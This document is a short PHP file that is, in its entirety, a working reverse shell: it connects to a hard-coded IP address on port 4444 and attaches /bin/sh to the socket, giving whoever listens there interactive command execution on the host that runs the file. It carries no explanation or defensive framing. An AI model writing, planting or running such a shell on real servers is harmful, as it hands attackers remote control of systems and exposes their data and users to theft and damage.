<?php
$ip = '10.23.124.231';
$port = 4444;


$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
